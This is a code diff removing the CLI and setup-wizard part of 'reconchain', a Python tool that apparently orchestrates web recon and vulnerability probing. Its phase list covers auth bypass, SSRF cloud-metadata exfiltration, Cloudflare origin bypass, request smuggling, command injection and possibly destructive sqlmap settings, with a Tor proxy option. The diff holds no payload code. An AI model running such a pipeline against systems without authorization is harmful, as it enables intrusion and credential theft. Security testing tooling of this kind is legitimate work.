-            ("14-ORIGIN", "Origin IP bypass (Cloudflare)"),
-            ("15-SECRETS", "Deep JS secret scanning"),
-            ("16A-AUTHZ", "Auth bypass header injection"),
-            ("16B-MASSASSIGN", "Mass assignment field discovery"),
-            ("17-IDOR", "ID manipulation / predictable IDs"),
-            ("17B-SSRFMETA", "Cloud metadata exfiltration (SSRF confirmed)"),
-            ("18-CLOUD", "Cloud bucket discovery (AWS/GCP/Azure)"),
-            ("19-GIT", "Git exposure scanning (.git + trufflehog)"),
-            ("20-GRAPHQL", "GraphQL introspection + schema analysis"),
-            ("21-WAF", "WAF detection (50+ vendor signatures)"),
-            ("22-NOSQLI", "NoSQL injection probes"),
-            ("23-RACE", "Race condition detection"),
-            ("24-JWT", "JWT token analysis"),
-            ("25-XXE", "XML external entity injection"),
-            ("26-CMDINJECT", "OS command injection detection"),
-            ("27-SSPP", "Server-side prototype pollution"),
-            ("28-CACHED", "Web cache poisoning/deception"),
-            ("29-DEPCHECK", "JS dependency vulnerability scan"),
-            ("30-LFI", "Local file inclusion / path traversal"),
-            ("31-OPENREDIR", "Open redirect detection"),
-            ("32-CLICKJACK", "Clickjacking protection check"),
-            ("33-CRLF", "CRLF injection detection"),
-            ("34-RATELIMIT", "Rate limiting detection"),
-            ("35-CORSADV", "Advanced CORS misconfiguration"),
-            ("36-JWTADV", "Advanced JWT attacks"),
-            ("37-FILEUPLOAD", "File upload vulnerability testing"),
-            ("38-SMUGGLE", "HTTP request smuggling detection"),
-            ("39-OAUTH", "OAuth misconfiguration testing"),
-            ("40-PWRESET", "Password reset logic testing"),
-            ("41-WEBSOCKET", "WebSocket security testing"),
-            ("42-LDAP", "LDAP injection detection"),
-            ("43-DESERIAL", "Deserialization attack detection"),
-            ("44-CHAIN", "Cross-phase finding correlation"),
-            ("45-EVIDENCE", "Capture request/response for confirmed findings"),
-        ]
-        print(f"\n{C['b']}Additional phases:{C['r']}")
-        for p, desc in _all_extra:
-            print(f"  {C['y']}{p:20}{C['r']} {desc}")
-        if level == "full":
-            skip_raw = _prompt("Phases to SKIP (comma-separated, or empty to run all)", default="")
-            skipped = {s.strip().upper() for s in skip_raw.split(",") if s.strip()}
-            extra_phases = {p for p, _ in _all_extra} - skipped
-        else:
-            incl_raw = _prompt("Phases to INCLUDE (comma-separated, or empty for none)", default="")
-            included = {s.strip().upper() for s in incl_raw.split(",") if s.strip()}
-            extra_phases = {p for p, _ in _all_extra} & included
-    selected = base_phases | extra_phases
-    # 8. Resume / Force
-    state_path = Path(out) / "state.json"
-    resume = False
-    force = False
-    if state_path.exists():
-        resume = _prompt_yes_no("State file exists — resume previous scan", default=True)
-        if resume:
-            force = _prompt_yes_no("Force re-run all phases (ignore cached results)", default=False)
-    # 9. Summary
-    print(f"\n{C['b']}{'─' * 60}{C['r']}")
-    print(f" {C['g']}Scan summary:{C['r']}")
-    print(f"   Domain:           {C['y']}{domain}{C['r']}")
-    print(f"   Output:           {C['y']}{out}{C['r']}")
-    print(f"   Level:            {C['y']}{level}{C['r']}")
-    print(f"   Proxy:            {C['y']}{proxy if proxy else 'none (auto-detected)'}{C['r']}")
-    print(f"   Phases:           {C['y']}{', '.join(sorted(selected))}{C['r']}")
-    print(f"   Jobs:             {C['y']}{jobs}{C['r']}")
-    print(f"   SQLmap level/risk:{C['y']} {sqlmap_level}/{sqlmap_risk}{C['r']}")
-    print(f"   Delay:            {C['y']}{delay}s{C['r']}")
-    print(f"   Cookie:           {C['y']}{'set' if cookie else 'none'}{C['r']}")
-    print(f"   Extra headers:    {C['y']}{len(extra_headers_list)} set{C['r']}")
-    print(f"   Resume:           {C['y']}{'yes' if resume else 'no'}{C['r']}")
-    print(f"   Force:            {C['y']}{'yes' if force else 'no'}{C['r']}")
-    print(f"   Fast mode:        {C['y']}{'yes' if speed else 'no'}{C['r']}")
-    print(f" {C['b']}{'─' * 60}{C['r']}")
-    if not _prompt_yes_no("Start scan", default=True):
-        log("info", "Aborted by user")
-        sys.exit(0)
-
-    # Build a namespace that run_pipeline expects
-    class NS:
-        pass
-
-    ns = NS()
-    ns.domain = domain
-    ns.out = out
-    ns.only = selected
-    ns.skip = set()
-    ns.jobs = jobs
-    ns.fast = False
-    ns.resume = resume
-    ns.force = force
-    ns.sample = False
-    ns.quiet = False
-    ns.no_color = False
-    ns.interactive = True
-    ns.sqlmap_level = int(sqlmap_level)
-    ns.sqlmap_risk = int(sqlmap_risk)
-    ns.delay = float(delay)
-    ns.proxy = proxy  # auto-detected from environment
-    ns.rate_limit = 0
-    def _resolve_count(v: str) -> int:
-        return sys.maxsize if v.lower() == "all" else int(v)
-
-    ns.sample_urls_fuzz = _resolve_count(sample_fuzz)
-    ns.sample_urls_params = _resolve_count(sample_params)
-    ns.cookie = cookie
-    ns.extra_headers = extra_headers_list if extra_headers_list else []
-    ns.daemon = False
-    ns.status = ""
-    ns.sample_urls_nosqli = 30
-    ns.sample_endpoints_race = 10
-    ns.sample_hosts_jwt = 20
-    ns.sample_urls_xxe = 10
-    ns.sample_urls_cmdi = 30
-    ns.sample_endpoints_sspp = 10
-    ns.sample_hosts_cached = 10
-    ns.sample_urls_depcheck = 30
-    ns.sample_hosts_cloud = 5
-    ns.sample_hosts_git = 5
-    ns.sample_hosts_graphql = 5
-    ns.sample_hosts_waf = 5
-    ns.sample_urls_redirect = 30
-    ns.sample_hosts_clickjack = 20
-    ns.sample_urls_crlf = 20
-    ns.sample_hosts_ratelimit = 10
-    ns.sample_endpoints_corsadv = 10
-    ns.sample_hosts_jwtadv = 20
-    ns.sample_urls_upload = 10
-    ns.sample_hosts_smuggle = 10
-    ns.sample_endpoints_oauth = 10
-    ns.sample_endpoints_pwreset = 10
-    ns.sample_hosts_websocket = 10
-    ns.sample_urls_ldap = 20
-    ns.sample_endpoints_deserial = 10
-    ns.sample_hosts_ssl = 10
-    ns.sample_hosts_origin = 10
-    ns.sample_endpoints_cors = 10
-    ns.sample_endpoints_l = 20
-    ns.sample_endpoints_post = 5
-    if speed:
-        ns.sample_urls_nosqli = min(ns.sample_urls_nosqli, 5)
-        ns.sample_urls_cmdi = min(ns.sample_urls_cmdi, 5)
-        ns.sample_urls_xxe = min(ns.sample_urls_xxe, 3)
-        ns.sample_urls_crlf = min(ns.sample_urls_crlf, 5)
-        ns.sample_urls_redirect = min(ns.sample_urls_redirect, 5)
-        ns.sample_urls_ldap = min(ns.sample_urls_ldap, 5)
-        ns.sample_urls_depcheck = min(ns.sample_urls_depcheck, 5)
-        ns.sample_urls_upload = min(ns.sample_urls_upload, 3)
-        ns.sample_hosts_ssl = min(ns.sample_hosts_ssl, 2)
-        ns.sample_hosts_origin = min(ns.sample_hosts_origin, 3)
-        ns.sample_hosts_cloud = min(ns.sample_hosts_cloud, 2)
-        ns.sample_hosts_git = min(ns.sample_hosts_git, 2)
-        ns.sample_hosts_graphql = min(ns.sample_hosts_graphql, 2)
-        ns.sample_hosts_waf = min(ns.sample_hosts_waf, 2)
-        ns.sample_hosts_jwt = min(ns.sample_hosts_jwt, 5)
-        ns.sample_hosts_jwtadv = min(ns.sample_hosts_jwtadv, 5)
-        ns.sample_hosts_cached = min(ns.sample_hosts_cached, 3)
-        ns.sample_hosts_clickjack = min(ns.sample_hosts_clickjack, 5)
-        ns.sample_hosts_ratelimit = min(ns.sample_hosts_ratelimit, 3)
-        ns.sample_hosts_smuggle = min(ns.sample_hosts_smuggle, 3)
-        ns.sample_hosts_websocket = min(ns.sample_hosts_websocket, 3)
-        ns.sample_endpoints_race = min(ns.sample_endpoints_race, 3)
-        ns.sample_endpoints_cors = min(ns.sample_endpoints_cors, 3)
-        ns.sample_endpoints_corsadv = min(ns.sample_endpoints_corsadv, 3)
-        ns.sample_endpoints_sspp = min(ns.sample_endpoints_sspp, 3)
-        ns.sample_endpoints_l = min(ns.sample_endpoints_l, 5)
-        ns.sample_endpoints_post = min(ns.sample_endpoints_post, 2)
-        ns.sample_endpoints_oauth = min(ns.sample_endpoints_oauth, 3)
-        ns.sample_endpoints_pwreset = min(ns.sample_endpoints_pwreset, 3)
-        ns.sample_endpoints_deserial = min(ns.sample_endpoints_deserial, 3)
-    return ns
-
-
-# ─────────────────────────────────── main ──────────────────────────────────
-def build_parser() -> argparse.ArgumentParser:
-    p = argparse.ArgumentParser(
-        prog="reconchain", description="Chain recon tools into a single orchestrated pipeline."
-    )
-    p.add_argument(
-        "-d", "--domain", type=str, default="", help="target root domain, e.g. example.com"
-    )
-    p.add_argument("-o", "--out", default="", help="output directory (default: ./out/<domain>)")
-    p.add_argument(
-        "-i",
-        "--interactive",
-        action="store_true",
-        help="interactive setup wizard (prompts for domain, level, etc.)",
-    )
-    p.add_argument(
-        "--only",
-        default=set(),
-        type=_parse_phase_csv,
-        help="comma-separated phases to run, e.g. 01-RECON,02-RESOLVE,04-SCAN",
-    )
-    p.add_argument(
-        "--skip",
-        default=set(),
-        type=_parse_phase_csv,
-        help="comma-separated phases to skip, e.g. 10-TLSCMS,23-RACE",
-    )
-    p.add_argument(
-        "-j",
-        "--jobs",
-        type=int,
-        default=MAX_PARALLEL_JOBS,
-        help=f"max parallel external processes (default: {MAX_PARALLEL_JOBS})",
-    )
-    p.add_argument(
-        "--fast",
-        action="store_true",
-        help="fast mode: only run essential recon phases "
-        "(01-RECON, 02-RESOLVE, 04-SCAN, 05-HARVEST), skipping vuln scanning",
-    )
-    p.add_argument(
-        "--resume",
-        action="store_true",
-        help="resume from ./out/state.json if it exists (only for the same target domain)",
-    )
-    p.add_argument(
-        "--force",
-        action="store_true",
-        help="re-run all phases even if output files already exist",
-    )
-    p.add_argument(
-        "--sample",
-        action="store_true",
-        help="downsample artifacts to 1 entry for faster downstream testing (default: keep all results)",
-    )
-    p.add_argument(
-        "--keep-all",
-        action="store_true",
-        help=argparse.SUPPRESS,
-    )
-    p.add_argument("-q", "--quiet", action="store_true", help="suppress info-level logs")
-    p.add_argument("--no-color", action="store_true", help="disable ANSI color output")
-    p.add_argument(
-        "--proxy",
-        type=str,
-        default="",
-        help="proxy URL for tools that support it, e.g. socks5://127.0.0.1:9050",
-    )
-    p.add_argument(
-        "--cookie",
-        type=str,
-        default="",
-        help="cookie string to include with HTTP requests (e.g. 'session=abc')",
-    )
-    p.add_argument(
-        "--header",
-        type=str,
-        action="append",
-        default=[],
-        dest="extra_headers",
-        help="extra HTTP header (can be repeated), e.g. --header 'Authorization: Bearer xyz'",
-    )
-    p.add_argument(
-        "--sqlmap-level",
-        type=int,
-        default=1,
-        choices=range(1, 6),
-        help="sqlmap --level (1-5, default: 1; higher = deeper but slower)",
-    )
-    p.add_argument(
-        "--sqlmap-risk",
-        type=int,
-        default=1,
-        choices=range(1, 4),
-        help="sqlmap --risk (1-3, default: 1; higher = more payloads but destructive)",
-    )
-    p.add_argument(
-        "--delay",
-        type=float,
-        default=0.0,
-        help="seconds to wait between requests (polite mode)",
-    )
-    p.add_argument(
-        "--rate-limit",
-        type=int,
-        default=0,
-        help="max requests per second (0 = unlimited)",
-    )
-    p.add_argument(
-        "--sample-urls-fuzz",
-        type=int,
-        default=200,
-        help="number of URLs to sample for fuzzing (default: 200)",
-    )
-    p.add_argument(
-        "--sample-urls-params",
-        type=int,
-        default=50,
-        help="number of URLs to sample for parameter discovery (default: 50)",
-    )
-    p.add_argument(
-        "--sample-hosts-ssl",
-        type=int,
-        default=10,
-        help="number of hosts to sample for SSL/TLS scanning via testssl (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-origin",
-        type=int,
-        default=10,
-        help="number of hosts to sample for origin bypass scans (favicon, crt.sh resolve, ipinfo) (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-cloud",
-        type=int,
-        default=5,
-        help="number of hosts to check for cloud bucket exposure (default: 5)",
-    )
-    p.add_argument(
-        "--sample-hosts-git",
-        type=int,
-        default=5,
-        help="number of hosts to scan for Git exposure (default: 5)",
-    )
-    p.add_argument(
-        "--sample-hosts-graphql",
-        type=int,
-        default=5,
-        help="number of hosts for GraphQL introspection (default: 5)",
-    )
-    p.add_argument(
-        "--sample-hosts-waf",
-        type=int,
-        default=5,
-        help="number of hosts for WAF detection (default: 5)",
-    )
-    p.add_argument(
-        "--sample-endpoints-l",
-        type=int,
-        default=20,
-        help="number of endpoints to sample for auth bypass / mass assignment probes (default: 20)",
-    )
-    p.add_argument(
-        "--sample-urls-xss-blind",
-        type=int,
-        default=20,
-        help="number of URLs to probe for blind XSS via OAST (default: 20)",
-    )
-    p.add_argument(
-        "--exclude-tags",
-        type=str,
-        default="",
-        help="nuclei tags to exclude (comma-separated), e.g. 'info,tech'",
-    )
-    p.add_argument(
-        "--sample-urls-ssti",
-        type=int,
-        default=5,
-        help="number of SSTI probe URLs (default: 5)",
-    )
-    p.add_argument(
-        "--sample-endpoints-post",
-        type=int,
-        default=5,
-        help="number of endpoints for POST mass-assignment probes (default: 5)",
-    )
-    p.add_argument(
-        "--sample-endpoints-cors",
-        type=int,
-        default=10,
-        help="number of endpoints for CORS misconfiguration probes (default: 10)",
-    )
-    p.add_argument(
-        "--sample-urls-nosqli",
-        type=int,
-        default=30,
-        help="number of URLs for NoSQL injection probes (default: 30)",
-    )
-    p.add_argument(
-        "--sample-endpoints-race",
-        type=int,
-        default=10,
-        help="number of endpoints for race condition testing (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-jwt",
-        type=int,
-        default=20,
-        help="number of hosts for JWT analysis (default: 20)",
-    )
-    p.add_argument(
-        "--sample-urls-xxe",
-        type=int,
-        default=10,
-        help="number of URLs for XXE injection probes (default: 10)",
-    )
-    p.add_argument(
-        "--sample-urls-cmdi",
-        type=int,
-        default=30,
-        help="number of URLs for command injection detection (default: 30)",
-    )
-    p.add_argument(
-        "--sample-endpoints-sspp",
-        type=int,
-        default=10,
-        help="number of API endpoints for prototype pollution probes (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-cached",
-        type=int,
-        default=10,
-        help="number of hosts for cache poisoning probes (default: 10)",
-    )
-    p.add_argument(
-        "--sample-urls-depcheck",
-        type=int,
-        default=30,
-        help="number of JS URLs for dependency vulnerability scanning (default: 30)",
-    )
-    p.add_argument(
-        "--sample-urls-redirect",
-        type=int,
-        default=30,
-        help="number of URLs for open redirect detection (default: 30)",
-    )
-    p.add_argument(
-        "--sample-hosts-clickjack",
-        type=int,
-        default=20,
-        help="number of targets for clickjacking detection (default: 20)",
-    )
-    p.add_argument(
-        "--sample-urls-crlf",
-        type=int,
-        default=20,
-        help="number of URLs for CRLF injection testing (default: 20)",
-    )
-    p.add_argument(
-        "--sample-hosts-ratelimit",
-        type=int,
-        default=10,
-        help="number of targets for rate limiting detection (default: 10)",
-    )
-    p.add_argument(
-        "--sample-endpoints-corsadv",
-        type=int,
-        default=10,
-        help="number of endpoints for advanced CORS testing (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-jwtadv",
-        type=int,
-        default=20,
-        help="number of targets for advanced JWT analysis (default: 20)",
-    )
-    p.add_argument(
-        "--sample-urls-upload",
-        type=int,
-        default=10,
-        help="number of upload endpoints to test (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-smuggle",
-        type=int,
-        default=10,
-        help="number of hosts for request smuggling testing (default: 10)",
-    )
-    p.add_argument(
-        "--sample-endpoints-oauth",
-        type=int,
-        default=10,
-        help="number of OAuth endpoints to test (default: 10)",
-    )
-    p.add_argument(
-        "--sample-endpoints-pwreset",
-        type=int,
-        default=10,
-        help="number of password reset endpoints to test (default: 10)",
-    )
-    p.add_argument(
-        "--sample-hosts-websocket",
-        type=int,
-        default=10,
-        help="number of hosts for WebSocket testing (default: 10)",
-    )
-    p.add_argument(
-        "--sample-urls-ldap",
-        type=int,
-        default=20,
-        help="number of URLs for LDAP injection testing (default: 20)",
-    )
-    p.add_argument(
-        "--sample-endpoints-deserial",
-        type=int,
-        default=10,
-        help="number of API endpoints for deserialization testing (default: 10)",
-    )
-    p.add_argument(
-        "--daemon",
-        action="store_true",
-        help="run in background; check progress with --status <domain>",
-    )
-    p.add_argument(
-        "--status",
-        type=str,
-        default="",
-        help="show live progress of a running scan (provide domain name, or 'list' to show all active scans)",
-    )
-    return p
-
-
-def main() -> int:
-    parser = build_parser()
-    args = parser.parse_args()
-    # ---- progress persistence: --status ----
-    if args.status:
-        if args.status.lower() == "list":
-            active = ScanStatus.list_active()
-            if not active:
-                print("No active scans found.")
-                return 0
-            for s in active:
-                print(f"  {s.get('domain')} — phase={s.get('phase')} "
-                      f"completed={len(s.get('completed_phases', []))}/{s.get('total_phases')} "
-                      f"errors={len(s.get('errors', []))}")
-            return 0
-        data = ScanStatus.load(args.status)
-        if not data:
-            print(f"No status found for domain '{args.status}'.")
-            print("Active scans:")
-            for s in ScanStatus.list_active():
-                print(f"  {s.get('domain')}")
-            return 1
-        print(f"Domain:   {data.get('domain')}")
-        print(f"Output:   {data.get('outdir')}")
-        print(f"Phase:    {data.get('phase')} — {data.get('phase_progress', '')}")
-        print(f"Started:  {data.get('started_at')}")
-        print(f"Updated:  {data.get('updated_at')}")
-        print(f"Progress: {len(data.get('completed_phases', []))}/{data.get('total_phases', '?')} phases completed")
-        if data.get("completed_phases"):
-            print(f"Done:     {', '.join(data['completed_phases'])}")
-        if data.get("running_phases"):
-            print(f"Running:  {', '.join(data['running_phases'])}")
-        if data.get("errors"):
-            print(f"Errors:   {len(data['errors'])}")
-            for e in data["errors"][-3:]:
-                print(f"  - {e}")
-        if data.get("missing_tools"):
-            print(f"Missing:  {', '.join(data['missing_tools'])}")
-        return 0
-    if args.interactive:
-        args = interactive_setup()
-    else:
-        if not args.domain or not _is_valid_hostname(args.domain):
-            parser.error(
-                "the following arguments are required: -d/--domain (or use -i for interactive)"
-            )
-        args.domain = args.domain.rstrip(".").lower()
-    if not args.out:
-        args.out = f"./out/{args.domain}"
-    args.out = str(Path(args.out).resolve())
-    if args.no_color:
-        disable_color()
-    if args.only and args.skip and (args.only & args.skip):
-        parser.error(
-            "phase(s) cannot be both --only and --skip: " + ", ".join(sorted(args.only & args.skip))
-        )
-    if args.quiet:
-        global log
-
-        def log(lvl, msg):  # type: ignore
-            if lvl in ("ok", "err", "warn"):
-                print(f"[{lvl[0].upper()}] {msg}", flush=True)
-
-    try:
-        if args.daemon:
-            daemon_args = [a for a in sys.argv if a != "--daemon"]
-            pidfile = Path(f"/tmp/reconchain_{args.domain.replace('.', '_')}.pid")
-            proc = subprocess.Popen(
-                [sys.executable] + daemon_args,
-                stdin=subprocess.DEVNULL,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                start_new_session=True,
-            )
-            pidfile.write_text(str(proc.pid))
-            log("info", f"daemon started (PID {proc.pid}); check status with: --status {args.domain}")
-            return 0
-        return asyncio.run(run_pipeline(args))
-    except ValueError as e:
-        log("err", str(e))
-        return 2
-    except KeyboardInterrupt:
-        log("warn", "interrupted")
-        return 130
-
-
-if __name__ == "__main__":
-    sys.exit(main())
+# 53 phases in PIPELINE: 00-SCOPE through 48-CONTENT (including 04b, 05b, 11b, 16A, 16B, 17b)
